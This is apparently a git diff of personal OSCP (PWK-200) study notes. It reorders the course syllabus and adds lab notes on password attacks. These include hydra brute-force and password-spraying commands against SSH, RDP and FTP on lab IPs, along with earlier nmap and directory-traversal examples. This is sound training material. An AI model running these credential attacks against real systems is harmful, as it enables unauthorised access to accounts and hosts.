@@ -109,10 +109,7 @@
 1. remediation
 
 ## PWK-200 syallabus
-1. Password attacks
-2. Windows privilege escalation
-3. Common web application attacks
-4. Information gathering
+6. Information gathering
    **Passive**
    - **OSINT**: public available info of a target
    - **Whois**: domain name info  
@@ -149,8 +146,7 @@
       | `--open`     | Shows **only open ports**, hides closed or filtered ports                   |
       | `IP_ADDRESS` | Target IP address to scan (replace with actual target)                      |
       | `-oN results`| Saves output in **normal format** to a file named `results`                 |
-6. Vulnerability scanning
-7. Windows privilege escalation
+7. Vulnerability scanning
 8. Introduction to web applcation attacks
    - Fingerprinting Web Servers with Nmap
      `sudo nmap -p80 -sV 192.168.50.20`: grab the web server banner
@@ -192,7 +188,7 @@
       -d '{"password": "pwned"}'
       ```
    - dd
-10. Common Web Application attacks
+9. Common Web Application attacks
     - **Directory traversal**: access files outside of the web root by using relative paths
       - absolute path: `cat /home/kali/etc/passwd`  
       - relative path: `cat ../../etc/pwd`: move 2 directories back to root file
@@ -204,19 +200,35 @@
     - File inclusion vulnerabilities
     - File upload vulnerabilities
     - Command injection
-12. SQL injection attacks
-13. Client-site attacks
-14. Antivirus evasion
-15. Fixing exploits
-16. Locating public exploits
-17. Linux privilege escalation
-18. Port redirection and SSH tunneling
-19. Tunneling through deep packet inspectation
-20. The metassploit framework
-21. Active directory introduction and enumeration
-22. Attacking active drectiory authentication
-23. Lateral movement in active directory
-24. Assembling the pieces
+10. SQL injection attacks
+11. Phishing Basics
+12. Client-site attacks
+13. Locating public exploits
+14. Fixing exploits
+15. Antivirus evasion
+16. Password attacks
+    - confirm ssh service running
+      `sudo nmap -sV -p 2222 192.168.50.201`
+    - unzip rockyou
+      `cd /usr/share/wordlists/   sudo gzip -d rockyou.txt.gz`
+    - hydra crack user george  
+      `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.160.201`
+    - password spraying > enumerate username from a valid password
+      `hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.160.201`
+    - ddd
+    - ddd
+    - ddd
+18. Windows Privilege Escalation
+19. Linux privilege escalation
+20. Port redirection and SSH tunneling
+21. Tunneling through deep packet inspectation
+22. The metassploit framework
+23. Active directory introduction and enumeration
+24. Attacking active drectiory authentication
+25. Lateral movement in active directory
+26. Enumerating AWS Cloud Infrastruture
+27. Attacking AWS cloud infrastruture 
+28. Assembling the pieces
 
 ## PWK-200 labs
 ### Information gathering
@@ -242,6 +254,22 @@
   `./gitleaks dir /home/kali/offsec/megacorpone.com/megacorpone -v -c=config/gitleaks.toml` (Leaks found on home/kali/offsec/megacorpone.com/megacorpone/xampp.users)  
 - 6.2.5 Shodan
 - 6.2.6 Security Headers and SSL/TLS
+
+### Password Attacks  
+- 16.1.1 SSH and RDP
+  **SSH** guess password
+  `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.160.201`
+  **RDP** guess user and export flag to local
+  `hydra -L /usr/share/wordlists/test_small_credentials.txt -p "SuperS3cure1337#" rdp://192.168.160.202`: crack username
+  `mkdir -p ~/shared`: create shared folder
+  `xfreerdp3 /u:justin /p:SuperS3cure1337# /v:192.168.160.202 /cert:ignore /drive:share,/home/kali/shared`: login to RDP and export flag to local
+  **ftp** guess password
+  `hydra -l itadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.160.202`
+  `ftp itadmin@192.168.160.202`
+  `get flag.txt`
+- 16.1.2 HTTP POST Login Form
+  
+- 16.2.1
 
 
 
